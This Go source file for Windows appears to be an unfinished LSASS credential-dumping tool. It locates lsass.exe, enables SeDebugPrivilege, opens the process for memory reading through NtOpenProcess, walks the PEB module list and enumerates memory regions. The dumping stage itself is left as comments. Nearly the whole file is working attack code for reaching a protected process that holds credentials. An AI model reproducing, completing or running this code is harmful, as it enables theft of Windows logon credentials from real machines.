package main


import (
	"fmt"
	"unsafe"
	"strings"
	"syscall"
	"unicode/utf8"
	"unicode/utf16"
	/// "encoding/json"
	"golang.org/x/sys/windows"
)

const (
	MAXIMUM_ALLOWED uintptr = 0x02000000
	PROCESS_QUERY_INFORMATION uintptr = 0x0400
	PROCESS_VM_READ uintptr = 0x0010
    SE_PRIVILEGE_ENABLED           = 0x00000002
    TOKEN_ADJUST_PRIVILEGES        = 0x0020
    TOKEN_QUERY                    = 0x0008
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    ProcessBasicInformation uintptr = 0x00
	ProcessQueryInformation uintptr = 0x0400
	ProcessVmRead uintptr = 0x0010
)

var (
	ntGetNextProcess *windows.LazyProc
	getProcessImageFileName *windows.LazyProc
	getProcessId *windows.LazyProc
	ntOpenProcess *windows.LazyProc
	openProcessToken *windows.LazyProc
    lookupPrivilegeValue *windows.LazyProc
    adjustTokenPrivileges *windows.LazyProc
    ntQueryInformationProcess *windows.LazyProc
    ntReadVirtualMemory *windows.LazyProc
    ntQueryVirtualMemory *windows.LazyProc
)


// Structures
type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type CLIENT_ID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type HANDLE uintptr

type LUID struct {
    LowPart  uint32
    HighPart int32
}

type TOKEN_PRIVILEGES struct {
    PrivilegeCount uint32
    Privileges     [1]LUID_AND_ATTRIBUTES
}

type LUID_AND_ATTRIBUTES struct {
    Luid       LUID
    Attributes uint32
}

type PROCESS_BASIC_INFORMATION struct {
    ExitStatus                   uint32
    PebBaseAddress               uintptr
    AffinityMask                 uintptr
    BasePriority                 int32
    UniqueProcessID              uintptr
    InheritedFromUniqueProcessID uintptr
}

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

type ModuleInformation struct {
	Field0	string `json:"field0"`
	Field1	string    `json:"field1"`
	Field2  string `json:"field2"`
	Field3  string `json:"field3"`
}


func init() {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    psapi := windows.NewLazySystemDLL("psapi.dll")
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    advapi32 := windows.NewLazySystemDLL("advapi32.dll")

    ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
    ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
    ntOpenProcess = ntdll.NewProc("NtOpenProcess")
    ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
    ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")


    getProcessImageFileName = psapi.NewProc("GetProcessImageFileNameA")
    
    getProcessId = kernel32.NewProc("GetProcessId")    

    openProcessToken = advapi32.NewProc("OpenProcessToken")
    lookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
    adjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
}


func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
    buffer := make([]byte, size)
    var bytesRead uintptr
    status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
    if status != 0 {
        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
        return 0
    }
    read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
    return read_value
}


func utf16BytesToUTF8(utf16Bytes []byte) []byte {
    u16s := make([]uint16, len(utf16Bytes)/2)
    for i := range u16s {
        u16s[i] = uint16(utf16Bytes[i*2]) | uint16(utf16Bytes[i*2+1])<<8
    }
    return []byte(string(utf16.Decode(u16s)))
}


func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr) string {
    buffer := make([]byte, size)
    var bytesRead uintptr
    status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
    if status != 0 {
        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
        return ""
    }
    for i := 0; i < int(bytesRead)-1; i += 1 {
        if buffer[i] == 0x00 && buffer[i+1] == 0x00 {
            return string(utf16BytesToUTF8(buffer[:i+2]))
        }
    }
    return ""
}


func Reverse(s string) string {
    size := len(s)
    buf := make([]byte, size)
    for start := 0; start < size; {
        r, n := utf8.DecodeRuneInString(s[start:])
        start += n
        utf8.EncodeRune(buf[size-start:], r)
    }
    return string(buf)
}


func GetProcessByName(process_name string) []uintptr{
   var proc_handles_slice []uintptr;
   var s uintptr = 0;
   for {
      res, _, _ := ntGetNextProcess.Call(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s)))

      if (res != 0) {
      	break
      }

      buf := [256]byte{}
      var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
      res, _, _ = getProcessImageFileName.Call(s, mem_address, 256);

      if (res > 1){
         var res_string string = string(buf[0:res]);
         var reverted_string string = Reverse(res_string);
         var index int = strings.Index(reverted_string, "\\");
         var result_name string = Reverse(reverted_string[0:index]);
         if (result_name == process_name){
            proc_handles_slice = append(proc_handles_slice, s);
         }
      }
   }
   return proc_handles_slice;
}


// NT
func enable_SeDebugPrivilege() uintptr {
    pid := uintptr(syscall.Getpid())
    hProcess := open_process(pid)

    // Get the process token
    var hToken syscall.Handle
    r1, _, err := openProcessToken.Call(hProcess, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
    if r1 == 0 {
        fmt.Println("Error opening process token:", err)
        return 0
    }
    defer syscall.CloseHandle(hToken)

    // Lookup the LUID for the SeDebugPrivilege
    var luid LUID
    r1, _, err = lookupPrivilegeValue.Call(uintptr(0), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("SeDebugPrivilege"))), uintptr(unsafe.Pointer(&luid)))
    if r1 == 0 {
        fmt.Println("Error looking up privilege value:", err)
        return 0
    }

    // Adjust the token privileges to enable SeDebugPrivilege
    tp := TOKEN_PRIVILEGES{
        PrivilegeCount: 1,
        Privileges: [1]LUID_AND_ATTRIBUTES{
            {
                Luid:       luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            },
        },
    }
    r1, _, err = adjustTokenPrivileges.Call(uintptr(hToken), uintptr(0), uintptr(unsafe.Pointer(&tp)), uintptr(0), uintptr(0), uintptr(0))
    if r1 == 0 {
        fmt.Println("Error adjusting token privileges:", err)
        return 0
    }
    return 1
}


func open_process(pid uintptr) uintptr {
	var handle uintptr
	objectAttributes := OBJECT_ATTRIBUTES{}
	clientId := CLIENT_ID{UniqueProcess: pid}

	status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
	if (status != 0) {
		fmt.Printf("Failed to open process. NTSTATUS: 0x%X\n", status)
		return 0
	}
	return handle
}


func query_process_information(proc_handle uintptr) ([]ModuleInformation){
	// Constants
	var ldr_offset uintptr = 0x18
	var inInitializationOrderModuleList_offset uintptr = 0x30
	
	var dll_base uintptr = 1337
	var flink_dllbase_offset uintptr = 0x20
	var flink_buffer_offset uintptr = 0x50
	var flink_buffer_fulldllname_offset uintptr = 0x40

	var pbi PROCESS_BASIC_INFORMATION
    var returnLength uint32

    // NtQueryInformationProcess
    status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
    if status != 0 {
        fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
        return nil
    }
	// PebBaseAddress
	peb_addr := pbi.PebBaseAddress 
    fmt.Printf("[+] PebBaseAddress:\t0x%s\n", fmt.Sprintf("%x", peb_addr))

    ldr_pointer := peb_addr + ldr_offset
    fmt.Printf("[+] Ldr Pointer:\t0x%s\n", fmt.Sprintf("%x", ldr_pointer))

    ldr_addr := read_remoteintptr(proc_handle, ldr_pointer, 8)
    fmt.Printf("[+] Ldr Address:\t0x%s\n", fmt.Sprintf("%x", ldr_addr))

    inInitializationOrderModuleList := ldr_addr + inInitializationOrderModuleList_offset
    next_flink := read_remoteintptr(proc_handle, inInitializationOrderModuleList, 8)
    fmt.Printf("[+] next_flink: \t0x%s\n", fmt.Sprintf("%x", next_flink))


    moduleinfo_arr := []ModuleInformation{}
    
    for (dll_base != 0){
		next_flink = next_flink - 0x10
		dll_base = read_remoteintptr(proc_handle, (next_flink + flink_dllbase_offset), 8)
		if (dll_base == 0){
			break
		}

		buffer := read_remoteintptr(proc_handle, (next_flink + flink_buffer_offset), 8)
		base_dll_name := read_remoteWStr(proc_handle, buffer, 256)
		// fmt.Printf("[+] base_dll_name: \t%s\n", base_dll_name)
		
		buffer = read_remoteintptr(proc_handle, (next_flink + flink_buffer_fulldllname_offset), 8)
        full_dll_path := read_remoteWStr(proc_handle, buffer, 256)
        // fmt.Printf("[+] full_dll_name: \t%s\n", full_dll_path)
		
		module_info := ModuleInformation{ Field0: base_dll_name, Field1: full_dll_path, Field2: (fmt.Sprintf("%x", dll_base)), Field3: "0"}
		moduleinfo_arr = append(moduleinfo_arr, module_info)
		next_flink = read_remoteintptr(proc_handle, (next_flink + 0x10), 8)
	}	
    return moduleinfo_arr
}


func main() {
	fmt.Println("Shock")
	process_name := "lsass.exe"
	proc_handle := GetProcessByName(process_name)[0]
	pid, _, _ := getProcessId.Call(proc_handle)
	fmt.Printf("Process PID:    \t%d\n", pid)
	priv_enabled := enable_SeDebugPrivilege()
	fmt.Printf("Privilege Enabled:\t%d\n", priv_enabled)
	proc_handle = open_process(pid)
	fmt.Printf("Process Handle: \t%d\n", proc_handle)
	/// moduleinfo_arr := query_process_information(proc_handle)
	/*for i := 0; i < len(moduleinfo_arr); i++ { 
        fmt.Println(moduleinfo_arr[i]) 
    }*/

    var mem_address uintptr = 0
	var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
	/// aux_size := 0
	/// aux_name := ""
	for (mem_address < proc_max_address_l){
		var memInfo MEMORY_BASIC_INFORMATION
		var resultLength uintptr
		status, _, _ := ntQueryVirtualMemory.Call(proc_handle, mem_address, 0, uintptr(unsafe.Pointer(&memInfo)), uintptr(unsafe.Sizeof(memInfo)), uintptr(unsafe.Pointer(&resultLength)))
		if status != 0 {
			fmt.Printf("NtQueryVirtualMemory failed with status: 0x%x\n", status)
			return
		}
		fmt.Printf("BaseAddress: 0x%x\n", memInfo.BaseAddress)
		fmt.Printf("RegionSize: 0x%x\n", memInfo.RegionSize)
		/*
		fmt.Printf("AllocationBase: 0x%x\n", memInfo.AllocationBase)
		fmt.Printf("AllocationProtect: 0x%x\n", memInfo.AllocationProtect)
		fmt.Printf("State: 0x%x\n", memInfo.State)
		fmt.Printf("Protect: 0x%x\n", memInfo.Protect)
		fmt.Printf("Type: 0x%x\n", memInfo.Type)
		*/
		
		/// if memInfo.Protect != PAGE_NOACCESS and memInfo.State == MEM_COMMIT:

		mem_address += memInfo.RegionSize
	}

    /*
    // Print JSON
    jsonData, err := json.Marshal(moduleinfo_arr)
	if err != nil {
		fmt.Printf("Error marshaling to JSON: %v\n", err)
		return
	}
	fmt.Println(string(jsonData))
	*/
}